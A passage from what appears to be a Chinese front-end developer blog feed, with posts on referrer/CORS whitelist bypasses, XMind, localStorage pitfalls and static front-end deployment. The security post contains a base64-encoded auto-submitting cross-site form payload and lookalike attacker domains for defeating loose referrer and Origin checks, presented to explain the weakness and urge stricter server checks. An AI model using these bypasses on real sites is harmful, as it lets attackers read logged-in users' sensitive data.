校验，有的接口因为需要客户端通用，考虑到客户端请求不带 <code>referrer</code> ，server端有时会放过 <code>referrer</code> 为空的情况，这个时候坏人就可以利用上面的规则构造出 <code>referrer</code> 为空的情况。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>base64解码下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">atob(<span class="string">'PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=='</span>)</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">"&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name='id' value='123'/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;"</span></span><br></pre></td></tr></table></figure><p>利用上文的第1条：协议为data开头，如果这个HTML页面向任何站点提交请求的话，这些请求的 <code>referrer</code> 都是空的。</p><p>或者利用第4条，强制设置不发送  <code>referrer</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"never"</span> <span class="attr">name</span>=<span class="string">"referrer"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span> <span class="attr">href</span>=<span class="string">"https://evacoder.com/users"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>既然存在作恶的空间我们就最好不要放过 <code>referrer</code> 为空的请求，对于客户端通过UA来过滤放行。</p><h4 id="referrer-的正则攻击点"><a href="#referrer-的正则攻击点" class="headerlink" title="referrer 的正则攻击点"></a><code>referrer</code> 的正则攻击点</h4><p>那不允许 <code>referrer</code> 为空就不存在安全问题了吗？ <code>referrer</code> 的校验依然有很多可绕过的地方。因为无法看到后端的 <code>referrer</code> 校验规则，我们只能碰碰运气，常见的问题如下：</p><p>如果已知在evacoder.com/demo中是可以通过 <code>referrer</code> 校验的，我们试着在抓包工具中修改 <code>referrer</code> 为以下：</p><p>1.<a href="https://www.badmanhackevacoder.com/demo" target="_blank" rel="noopener">https://www.badmanhackevacoder.com/demo</a>  （可能只校验了<code>/^.*evacoder.com/demo$/</code>）</p><p>2.<a href="https://www.evacoder.badman.com/evacoder.com/demo" target="_blank" rel="noopener">https://www.evacoder.badman.com/evacoder.com/demo</a>   (可能只校验了<code>/^.*evacoder.com/demo$/</code>,可以构造一个对应的文件夹来绕过）</p><p>3.<a href="https://badman.com?id=evacoder.com/demo" target="_blank" rel="noopener">https://badman.com?id=evacoder.com/demo</a> （构造参数）</p><h4 id="CORS中的类似攻击"><a href="#CORS中的类似攻击" class="headerlink" title="CORS中的类似攻击"></a>CORS中的类似攻击</h4><p>我们常说AJAX有跨域限制，但是很多人没有注意到即使跨域，AJAX其实也已经将请求发出去，只不过因为浏览器限制，JS获取不到响应而已，类似ping img。为了解决AJAX跨域的问题，现代我们通常使用CORS来跨域资源共享。</p><p>IE10以上都支持CORS，放心使用，只需要后端配置允许CORS，前端啥也不用改就可以直接获取到跨域的请求，我们可以视情况在IE10以下使用JSONP来兼容。</p><p>node配置示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'*'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 任意域名都可访问此接口，不能携带cookie</span></span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>);</span><br><span class="line">  <span class="comment">// res.header('Access-Control-Allow-Origin', 'http://www.baidu.com'); // 只有www.baidu.com 可以访问。</span></span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Headers'</span>, <span class="string">'Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild'</span>);</span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Methods'</span>, <span class="string">'PUT, POST, GET, DELETE, OPTIONS'</span>);<span class="comment">// 允许的请求方法</span></span><br><span class="line">  <span class="keyword">if</span> (req.method == <span class="string">'OPTIONS'</span>) &#123;</span><br><span class="line">    res.send(<span class="number">200</span>); <span class="comment">// 在正常的请求之前，会发送一个验证，是否可以请求。</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面说到 <code>referrer</code> 因为正则校验不严格，所以容易出现可以绕过的问题，在CORS中一样存在。</p><p>对于CORS为*的，我们不必关心，它已经放弃了限制，你随便来调用吧，要是有笨到将敏感接口如此设置的，应该会被直接开除吧。</p><p>但是假设我们F12突然发现 <a href="https://www.evacoder.com" target="_blank" rel="noopener">https://www.evacoder.com</a> 中有个接口居然设置了CORS，</p><p>CORS请求成功之后，在response header中会有以下请求头，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Response Header</span><br><span class="line">Origin: https://www.evacoder.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Allow-Headers: Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,token</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</span><br><span class="line">Access-Control-Allow-Origin: https://www.evacoder.com</span><br></pre></td></tr></table></figure><p>这里的CORS只在指定的某些域名可以使用，同样仅在前端是看不出来在后端设置的具体域名的。</p><p>我们来碰碰运气，在抓包工具中修改Origin为以下：</p><p>1.<a href="https://www.badmanhackevacoder.com" target="_blank" rel="noopener">https://www.badmanhackevacoder.com</a> （可能只校验了<code>/^.\*evacoder.com$/</code>）</p><p>2.<a href="https://www.evacoder.badman.com" target="_blank" rel="noopener">https://www.evacoder.badman.com</a> (可能只校验了<code>/^.\*evacoder..\*.com$/</code>）</p><p>去测试吧，可能会碰到漏网之小白，再找到敏感接口，将 <a href="https://www.badmanhackevacoder.com/testPage" target="_blank" rel="noopener">https://www.badmanhackevacoder.com/testPage</a> 发给用户，用户可能已经登录过evacoder.com，坏人页请求敏感接口成功，就能获取到小白在evacoder的敏感信息了。</p><p>CORS可攻击点的范围比 <code>referrer</code> 要稍小一点，CORS只能构造假的domain， <code>referrer</code>  还可以构造参数，可发挥的空间更大。</p><p>虽然一般是server端referer和CORS白名单，但是作为对浏览器最了解的前端，为server端提供安全建议也是我们应该做的哦~</p><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">CORS详细介绍</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看到一个抢红包的活动页，准备把接口copy出来自动测试却发现403了，这种情况一般都是因为有 &lt;code&gt;referrer&lt;/code&gt; 校验。我们也经常会通过 &lt;code&gt;referrer&lt;/code&gt; 白名单来限制接口的盗用，今天来分析下可能存在的攻击点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://evacoder.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>「 工具 」绘图工具指南</title>
    <link href="https://evacoder.com/2019/03/18/xmind/"/>
    <id>https://evacoder.com/2019/03/18/xmind/</id>
    <published>2019-03-18T09:29:06.000Z</published>
    <updated>2019-05-10T04:14:46.872Z</updated>
    
    <content type="html"><![CDATA[<p>除了写出高性能的算法，面对复杂的业务逻辑，画出清晰的mind map 往往会达到事半功倍的效果。<br><a id="more"></a></p><h4 id="绘图工具"><a href="#绘图工具" class="headerlink" title="绘图工具"></a>绘图工具</h4><p>调研了下一般后端小伙伴使用 Office 的 visual 来绘图，也有使用chrome的gliffy在线就可以画图</p><p>用mac的PM用sketch画图</p><p>测试同学用XMind来画分支图</p><p>个人感觉还是XMind更清晰美观，今天系统的感受了下xmind，记录下如何画出清晰美丽的mind map。</p><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><p>基本掌握三个快捷键就可以开始画图了</p><p>tab添加子主题</p><p>enter添加同级主题</p><p>space进入编辑状态</p><h4 id="模版风格"><a href="#模版风格" class="headerlink" title="模版风格"></a>模版风格</h4><p>系统默认提供了一些模版供我们使用，个人比较喜欢清爽和简单两个风格</p><p>选中某个风格之后，最好就不要过多更改内部色调了，否则看起来会杂乱</p><p>有的时候系统的走向不符合我们的需求，这个时候我们可以选中某个模块，右侧菜单会出现结构选项，我们就可以自由选择从左到右或者从上到下，子分支全都集中在一侧，鱼骨图以及SWOT分析等各个场景的结构</p><p>比较喜欢<strong>打开彩虹分支</strong>，色彩上会更清晰一些</p><p><strong>关掉线条渐细</strong>，因为写代码一般是时序图，并没有明显的层级关系，所以没必要打开线条渐细</p><p>这样组合起来，加上一些自己的设计基本就可以画出丰富多彩，美观清晰的mind map了。</p><p>一起来画精致的mind map，让pm对你刮目相看，自惭形秽吧~</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>以后遇到实际例子再补充此文</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;除了写出高性能的算法，面对复杂的业务逻辑，画出清晰的mind map 往往会达到事半功倍的效果。&lt;br&gt;
    
    </summary>
    
    
      <category term="Tool" scheme="https://evacoder.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>「 缓存 」localStorage实践指南</title>
    <link href="https://evacoder.com/2019/02/20/localStorage/"/>
    <id>https://evacoder.com/2019/02/20/localStorage/</id>
    <published>2019-02-20T12:11:15.000Z</published>
    <updated>2019-06-05T07:48:34.709Z</updated>
    
    <content type="html"><![CDATA[<p>记录localStorage在实践中遇到的具体问题。</p><a id="more"></a><h4 id="localStorage和cookie的区别"><a href="#localStorage和cookie的区别" class="headerlink" title="localStorage和cookie的区别"></a>localStorage和cookie的区别</h4><h5 id="1-大小"><a href="#1-大小" class="headerlink" title="1.大小"></a>1.大小</h5><p>localStorage可以存储大约5M的数据，cookie一般只能存储4kb。<br>两者都有大小限制，不同浏览器单次设置的大小和总条数会有差异，需要做好超过限制之后的处理</p><h5 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h5><p>cookie由来已久，几乎所有浏览器都支持，兼容性更好<br>localStorage支持&gt;=IE8，还有些特别的情况下兼容性不好：<br>ie11下用户保护模式下调用<code>window.localStorage</code>直接报错<br>禁止cookie时调用<code>window.localStorage</code>直接报错，但<code>document.cookie</code>不会报错<br>safari无痕模式下cookie是可用的，localStorage存在但是setItem时会报错(chrome的无痕模式localStorage和cookie都可用，只不过关闭浏览器之后会清除)</p><h5 id="3-特性"><a href="#3-特性" class="headerlink" title="3.特性"></a>3.特性</h5><p>cookie在每次请求中都会携带，server端可以CRUD cookie，但是localStorage只是种浏览器存储方式而已，server端无法操作<br>cookie必须url encode<br>cookie可以设置如下属性：</p><ul><li>HTTPOnly：避免被js操作保证安全</li><li>expire：有过期时间</li><li>secure：必须在https下传输</li><li>path：不同页面可以设置不同path避免多个tab之间数据污染<br>localStorage没有这些功能，只有key，value设置，需要约定好避免存储的key，避免数据污染</li></ul><h5 id="4-持久性"><a href="#4-持久性" class="headerlink" title="4.持久性"></a>4.持久性</h5><p>浏览器缓存中小白用户可能也知道怎么清除cookie，但是localStorage被清除的概率会低一些，所以可以使用LS来存储设备指纹</p><h5 id="5-跨域限制"><a href="#5-跨域限制" class="headerlink" title="5.跨域限制"></a>5.跨域限制</h5><p>sessionStorage不能共享，localStorage在同源document间共享，cookie在同源且符合path规则的文档间共享</p><h4 id="localStorage的使用注意"><a href="#localStorage的使用注意" class="headerlink" title="localStorage的使用注意"></a>localStorage的使用注意</h4><h5 id="1-安全问题"><a href="#1-安全问题" class="headerlink" title="1.安全问题"></a>1.安全问题</h5><p>一旦有xss漏洞，有坏人可能将恶意代码注入到localStorage中，导致即便修复了xss恶意代码也存在的问题。 所以遇到这种情况一定要注意发新版清除用户端的localStorage。</p><h5 id="2-为何静态资源JS-CSS不存在localStorage中"><a href="#2-为何静态资源JS-CSS不存在localStorage中" class="headerlink" title="2.为何静态资源JS/CSS不存在localStorage中"></a>2.为何静态资源JS/CSS不存在localStorage中</h5><ul><li>SEO：之前本站在robots.txt中禁止抓取assets目录（包括CSS和JS等），导致google搜索中出现页面不适合移动端访问的提示，影响了SEO。如果将JS/CSS存储在localStorage中可能会导致爬虫抓到的页面错误。</li><li>FOUC:如果先输出HTML然后再从JS中读取CSS加载，会造成页面闪烁，体验很差</li><li>PC和移动端的考虑：PC端网速比较快，浏览器兼容性没那么好，使用localStorage的意义不大，移动端倒是支持的比较好，而且网速慢，是一个比较好的优化点</li><li>真的有必要吗：如果JS和CSS等静态资源设置合理的缓存和过期时间，localStorage读取并执行可能并不如from disk cache甚至不如304协商缓存快</li></ul><h5 id="3-不兼容情况下的处理"><a href="#3-不兼容情况下的处理" class="headerlink" title="3.不兼容情况下的处理"></a>3.不兼容情况下的处理</h5><p>safari无痕模式下localStorage和sessionStorage本身是存在的，只是setItem会报错</p><p>有些浏览器不支持storage或者用户设置禁止了localStorage，调用<code>window.localStorage</code>时都会直接报错</p><p>Sentry上大量抓到这样的错误</p><blockquote><p>Failed to read the ‘localStorage’ property from ‘Window’: Access is denied for this document.<br>兼容性还是要考虑好，最好使用try catch来判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let isSupportStorage = false;</span><br><span class="line">try &#123;</span><br><span class="line">  localStorage.setItem(&apos;testStorage&apos;, 1);</span><br><span class="line">  isSupportStorage = true;</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">  // 无痕模式或者不支持storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="localStorage和sessionStorage的区别"><a href="#localStorage和sessionStorage的区别" class="headerlink" title="localStorage和sessionStorage的区别"></a>localStorage和sessionStorage的区别</h4><p>sessionStorage存储数据只在本次会话有效，数据仅在当前窗口有效，即不能跨tab</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录localStorage在实践中遇到的具体问题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JS" scheme="https://evacoder.com/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>「 基础设施 」现代化前端工程发布</title>
    <link href="https://evacoder.com/2019/02/20/static_deploy/"/>
    <id>https://evacoder.com/2019/02/20/static_deploy/</id>
    <published>2019-02-20T11:37:12.000Z</published>
    <updated>2019-05-10T04:05:18.710Z</updated>
    
    <content type="html"><![CDATA[<h4 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h4><p>接手八年没重构的老项目，每个字符都透露着远古时期历史的气息，之前的你可能不懂那些性能优化上的思考，看了这种古老的项目，你马上就能get到现代文明之光的美好。</p><p>重写不是没想过的，一万次深呼吸准备大干一场，一万次管住了自己爪爪。</p><p>你还年轻，谁知道哪个页面是需要用的，哪里会藏着深坑。</p><p>加一些打点统计，熟悉代码好几年，终于可以开始重构了，但是当然不能操之过急，一下推倒重来，我们选择从新增页面开始，再慢慢将老的部分迁移到新的现代化的开发模式。</p><p>嗯，新项目开始啦。我们简单的选择vue+webpack+babel，完全<strong>前后端分离</strong>的开发模式，代码层面不深入展开来说，今天只讲前端静态发布。</p><a id="more"></a><p>vue-cli生成新项目，npm run buid得到dist目录。index.html（下文以入口文件相称），还有css，js等（下文以静态资源相称），前端说来说去就是HTML，js，css三剑客，让我们开始部署吧。</p><h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><p>部署有啥好说的，全丢到静态服务器上，用户可以访问到就可以了呗。</p><p>各种404，路径没配置好，改下vue.config.js的publicPath。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  publicPath: process.env.NODE_ENV === <span class="string">'production'</span> ? <span class="string">'//static.evacoder.com/userCenter/'</span> : <span class="string">''</span>,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 所有匹配不到的请求都映射到此域名下</span></span><br><span class="line">    <span class="comment">// 1.配置host 127.0.0.1到 evacoder.com</span></span><br><span class="line">    <span class="comment">// 再将localhost:8080 nginx代理到 127.0.0.1:80 就可以绕过登录态了</span></span><br><span class="line">    proxy: <span class="string">'https://evacoder.com'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ok~再部署一把。</p><p>哦？可是我们静态服务器的域名是static.evacoder.com。</p><blockquote><p>Access to XMLHttpRequest at ‘<a href="https://evacoder.com/getData">https://evacoder.com/getData</a>‘ from origin ‘<a href="https://static.evacoder.com" target="_blank" rel="noopener">https://static.evacoder.com</a>‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</p></blockquote><p>又见到了我们的老朋友<strong>跨域</strong>，毕竟你不是native开发，不用管跨域的问题。</p><h4 id="部署路径"><a href="#部署路径" class="headerlink" title="部署路径"></a>部署路径</h4><p>妥协吧，把dist文件夹直接丢到server端项目里吧，或者静态资源上cdn，至少把入口文件丢在人家的地盘下。</p><p>将入口文件放在server端的项目主要有下面这些考虑：</p><ul><li>跨域</li></ul><p>静态项目发布之后一般都需要另一个域名来访问，比如static.evacoder.com。用户通过static.evacoder.com来访问的话会很丑陋很奇怪。</p><p>更重要的是api接口在evacoder.com下会有跨域的问题。所以一般index.html放在server端的项目下就不会跨域了。</p><p>但是实际上可以通过nginx的配置来解决这个问题，通过proxy_pass<strong>反向代理</strong>一下，将static.evacoder.com/center/index反向代理到evacoder.com下就不会跨域了，可以解决这个问题。</p><p>nginx可以解决很多问题，感兴趣查看这篇（TODO，nginx加成，提升前端开发效率）。</p><ul><li>上线先后</li></ul><p>是有可能存在这样的需求，【修改某个api参数sex从0，1，2改为male，female，unknown】。</p><p>如果前后端代码放在一起的话，开发完这个功能一起上线即可。</p><p>（一起上线的意思是：因为代码放在一起，后端是一台一台机器的上线，比如有5台机器，上线的过程中上到第2台机器的时候，第2台机器就会被摘掉，用户只能访问到剩下4台，第2台机器自己就在后面悄咪咪的部署，部署完成了之后又回到用户可访问的状态，不会出现FE上完了，api没上完的情况）</p><p>但是如果动静分离部署的话，就会存在谁先上线的问题。</p><p>如果server先上线，FE还没修改，参数不匹配，会400错误。</p><p>如果FE先上线，server不能接受新改的参数。</p><p>一个功能需要前后端协同开发，功能上有依赖，如果不能一起发布的话，总是会出现用户暂时访问有问题的情况。</p><p>正常情况下我们不能放弃任何一丝流量（当然也是为了自己，免得为了降低影响眼圈黑黑半夜上线）</p><p>一般情况下只能server端做api参数兼容了，觉得冗余的话之后再去掉兼容的代码。</p><p>（其实倒也不用想这个问题，前后端分离的好处之一就是：后端提供的接口也可以给提供给native客户端使用，他们的代码一发出去就永远在用户手中，总是会有用户没有更新版本，后端的兼容一定必须存在）。</p><ul><li>回滚先后</li></ul><p>同理，分离部署还涉及到分离回滚。反正如果有bug，谁先回滚谁后回滚还需要考虑吗？</p><p>还是刚刚那个例子，将【修改某个api参数sex从0，1，2改为male，female，unknown】的功能回滚。</p><p>希望后端上次的api兼容没有删掉，就可以让前端先回滚。如果删掉了，只能开发之后再回滚了。</p><p>为了避免这种上线回滚先后的问题，我本来是希望能把前端打包的入口文件放在服务端来拒绝任何一点流量损失，但是我们经常会遇到前端只修改一个js，css甚至只是一行文案而已，都需要协同后端编译打包整体上线。</p><p>本来是希望如果是简单的修改，就直接把前端入口文件index.html scp到线上机器，如果是前后端有依赖性的修改，则可以同时部署。</p><p>但是上线有规范，操作不安全，没能达成希望，再考虑到下面分离部署的优点：</p><p>1.前端把握主动权，分离部署不需要求后端同学帮忙部署了，充满了前端自豪感嘻嘻。</p><p>2.保持服务稳定性，前端改一行文案都需要经过后端100台机器重新上线实在太不安全了。</p><p>3.上线快，前端经常会被催着改行文案赶紧上线，静态部署分分钟就可以完成，而后端上线却需要很多台机器需要很长时间。</p><p>4.权责分明，谁的问题谁负责。</p><p>商量一下，后端同学回想起帮我们上线个文案要点100台机器的痛苦往事，肯定还是会选择动静分离部署，接口兼容这种比较少见的情况之后再说吧。我们还是选择了眼前的利益，<strong>先不过度设计</strong>，分开部署。</p><p>一般的需求，后端先上线接口，前端再直接发布。</p><h4 id="服务端渲染首屏直出"><a href="#服务端渲染首屏直出" class="headerlink" title="服务端渲染首屏直出"></a>服务端渲染首屏直出</h4><p>是否有必要SSR</p><ul><li>直出：数据填充好再返回</li></ul><p>对于不需要数据填充的呢？</p><p>传统的后端是数据服务端</p><p>中间层服务端去数据服务端请求数据，然后渲染完整的页面</p><p>分离是分工，让每个人做自己专业的工作，发挥最大的作用，而不是为了分离而分离。</p><p>这里说的首屏渲染速度并不是说页面加载的速度</p><p>服务器渲染HTML，是因为能够提高用户第一次访问网站的感知性能，第一个HTTP请求就能够返回可以<strong>渲染完</strong>的HTML，用不着浏览器端多一个AJAX请求去获取数据再渲染，这样用户就会感觉到这网站性能挺快。</p><p>这里重点在于展示的<strong>数据是ajax请求返回还是后端直接填充</strong>。</p><p>现在的服务端渲染和以往的不一样的可能是，之前是脏乱的服务端填充模版引擎，现在依然是返回json数据前端来解析，分工依然很明确，只是从ajax转成了后端直接返回数据。</p><p>不该SPA的也强行SPA，好在我们有code split &amp; aync loading</p><p>SEO 本质是一个服务器向另一个服务器发起请求，解析请求内容。但一般来说搜索引擎是不回去执行请求到的js的。也就是说，如果一个单页应用，html在服务器端还没有渲染部分数据数据，在浏览器才渲染出数据，而搜索引擎请求到的html是没有渲染数据的。 这样就很不利于内容被搜索引擎搜索到。 所以服务端渲染就是尽量在服务器发送到浏览器前 页面上就是有数据的。</p><h4 id="部署系统做了哪些事"><a href="#部署系统做了哪些事" class="headerlink" title="部署系统做了哪些事"></a>部署系统做了哪些事</h4><p>我司的部署系统封装了puppet等开源项目，在git项目中加上deploy文件之后，部署系统就可以从git上拉代码，（其实就是创建了用户，git clone下来），编译的时候选择git版本进行编译。</p><p>deploy文件写明了copy git项目到哪个机器上。</p><p>发布机提供了docker image，来提供稳定性和编译能力，可以选择安装node,npm,nginx等。</p><p>1.git项目添加部署文件（deploy文件）</p><p>2.创建部署任务，方便权限控制和追溯。</p><p>基本上可以理解为在线上机器上执行以下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@git.n.evacoder.com:demo/eva-blog.git</span><br><span class="line"><span class="built_in">cd</span> eva-blog</span><br><span class="line"><span class="comment"># 更新代码</span></span><br><span class="line">git pull</span><br><span class="line"><span class="comment"># 部署不同的分支及版本</span></span><br><span class="line">git checkout v2</span><br><span class="line">npm run build</span><br><span class="line"><span class="comment"># 将内容copy到线上路径</span></span><br><span class="line">mv dist ../online/dist</span><br></pre></td></tr></table></figure><h4 id="缓存设置"><a href="#缓存设置" class="headerlink" title="缓存设置"></a>缓存设置</h4><p>静态发布很重要的一个考量是缓存设置。</p><p>静态资源因为webpack生成了版本号，可以全部都设超长缓存时间。</p><p>我们不仅仅可以使用webpack的基础功能，分离第三方资源成vendor.js，对于稳定的功能，也可以在webpack中抽离出来，分成经常改的文件和不经常修改的，保证最优的缓存策略。</p><p>但是入口文件呢？静态资源更新的再好，入口文件有缓存，新版总是触达不到用户。</p><p>html相比于后端return的jsp会有缓存？</p><p>no，其实后端return的jsp也是设置之后才禁用了缓存，对于html，我们可以加上下面的meta信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"pragma"</span> content=<span class="string">"no-cache"</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Cache-Control"</span> content=<span class="string">"no-cache, must-revalidate"</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"expires"</span> content=<span class="string">"0"</span>&gt;</span><br></pre></td></tr></table></figure><p>经常听说前后端分离不利于SEO，</p><p>no，没有差别，甚至因为分离之后，访问的url更清爽越短越利于seo。</p><h4 id="覆盖or非覆盖式发布"><a href="#覆盖or非覆盖式发布" class="headerlink" title="覆盖or非覆盖式发布"></a>覆盖or非覆盖式发布</h4><p>一般情况下我们都是覆盖式发布，比如发布 <a href="http://evacode.com/static/a.js?v=1.0" target="_blank" rel="noopener">http://evacode.com/static/a.js?v=1.0</a> ，每次都覆盖原本的a.js，为了避免缓存，每次上线修改版本v来避免缓存。</p><p>如果使用webpack，前端修改之后npm run build，如果相关文件有修改，webpack生成的hash值会改变，这样就有最优的缓存策略。</p><p>每次生成的静态资源的路径不一样，那每个版本（至少上一个版本的js，css）需要保留下来吗？</p><p>当然是为了回滚考虑，如果新build出来的有bug怎么办？</p><p>如果使用非覆盖式发布，所有build出来的静态资源都放着，时间久了会很耗费资源，唯一的好处是方便回滚。</p><p>如果使用覆盖式发布，回滚是不可能回滚了，因为原来的版本已经被删掉了，但是反正有git来版本管理，可以选择1.轻松revert之后再部署，2.徒手改bug之后重新build后部署。</p><p>我司的部署系统是与git关联，可以直接选择对应的git版本，都不需要手动再次revert代码git提交，更没有必要选择非覆盖式发布了。</p><p>前人使用的是和git commit号一致的版本号来非覆盖式发布，实际只需要210kb，但是存储以前的版本7年了，现在占用的磁盘资源有4.5g了，非常的浪费，而且年代久远也不敢贸然删除，非覆盖式其实意义并不大。</p><p>覆盖式发布并没有太大的影响，而且更清爽。</p><p>反正是静态资源不需编译，更有机智的小伙伴选择git-hook来发布，merge到master的时候自动覆盖服务器上的文件，瞬间完成部署，回滚时也是git reset下，但考虑到权限控制，查问题追溯方便，专门的部署系统存在肯定有其意义。（虽然仔细想想，仅就静态资源来说，gitlab也能提供这些功能，就是需要绕绕弯，专门的部署系统是为了提供所有语言代码的部署支持的）。</p><h4 id="需要使用专门的发布机来build发布吗"><a href="#需要使用专门的发布机来build发布吗" class="headerlink" title="需要使用专门的发布机来build发布吗"></a>需要使用专门的发布机来build发布吗</h4><p>还有一个问题是是否有必要去本地化操作，使用发布机来进行npm run build。</p><p>我个人觉得package.json已经写明了依赖的版本，所以可能意义不太大。</p><p>虽然package.json保证了环境的一致性，但是还是会出现打包出来不一致的问题么？</p><h4 id="cdn的使用"><a href="#cdn的使用" class="headerlink" title="cdn的使用"></a>cdn的使用</h4><p>如果使用cdn，非覆盖式发布更浪费资源，我们需要将js，css等放到cdn上，修改入口文件的路径。</p><p>经常看了很多前端性能优化的方案，回答面试题时头头是道，动不动就上cdn，动静分域名部署等等，实则是纸上谈兵，道理是那个道理，但这次请教sre同学也有了新的思考，落地时真的应该和sre同学探讨一下。</p><p>需要除前端之外的同学参与的性能优化方案，都需要评估。</p><p>cdn能够提高访问速度，但是有没有容灾方案，收效与风险孰轻孰重。cdn回源带来的抖动也是很严重的，需要评估回滚的方案，不要蹭别人的用，因为别人的流量打满了最后也会导致我们的服务挂掉，分摊成本也要考虑。</p><p>http2，ipv6他们都比我们专业，了解背后的故事。</p><h4 id="路由的配置"><a href="#路由的配置" class="headerlink" title="路由的配置"></a>路由的配置</h4><p>需要配置nginx的还有：route使用history需要后端配置，使用hash会比较奇怪。</p><p>参照<a href="https://router.vuejs.org/zh/guide/essentials/history-mode.html" target="_blank" rel="noopener">vue 文档</a>来处理。</p>]]></content>
    
    <summary type="html">
    
